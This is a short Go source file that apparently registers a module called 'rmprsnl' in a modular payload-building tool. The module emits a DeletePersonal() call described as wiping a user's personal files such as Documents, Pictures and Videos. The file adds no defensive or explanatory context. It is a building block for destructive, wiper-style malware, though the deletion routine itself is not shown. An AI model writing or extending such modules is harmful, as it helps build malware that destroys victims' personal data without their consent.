package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "rmprsnl",
		Description: "Deletes personal files (Documents, Pictures, Videos, etc.)",
		ReturnsData: false,
		Args:        []Arg{},
		Dependencies: []string{
			"system.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "DeletePersonal()\n"

			return output, nil
		},
	})
}
